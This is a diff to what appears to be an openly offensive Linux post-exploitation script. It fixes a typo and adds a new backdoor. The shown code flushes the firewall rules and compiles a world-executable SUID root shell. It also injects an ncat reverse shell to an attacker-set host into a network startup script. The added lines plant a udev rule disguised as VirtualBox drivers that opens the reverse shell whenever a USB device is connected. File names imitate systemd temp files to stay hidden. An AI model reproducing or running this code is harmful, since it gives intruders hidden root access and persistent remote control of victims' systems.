@@ -19,7 +19,7 @@ TMPNAME2=".systemd-private-8cfee1de0cea4c34b1b5399f401acc1f-systemd-timesyncd.se
 # Description : install ncat if not available on the machine
 if ! [ -x "$(command -v ncat)" ]; then
   wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat -O $TMPDIR2/ncat 2> /dev/null
-  chmox +x $TMPDIR2/ncat
+  chmod +x $TMPDIR2/ncat
   export PATH=/var/tmp:$PATH
 fi
 
@@ -28,17 +28,24 @@ fi
 # Description : Clean iptables, create a SUID binary, reverse shell root at startup inside /etc/network/if-up.d/upstart
 cat << EOF > $TMPDIR2/chocolatine
 #!/bin/bash
+
+# clear iptables
 iptables -F 2>/dev/null
 iptables -X 2>/dev/null
 
+# suid binary
 echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
 gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
 rm $TMPDIR2/croissant.c
 chown root:root $TMPDIR2/croissant
 chmod 4777 $TMPDIR2/croissant
 
+# startup backdoor
 RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
+
+# driver backdoor
+echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
 
 rm $TMPDIR2/chocolatine
 EOF
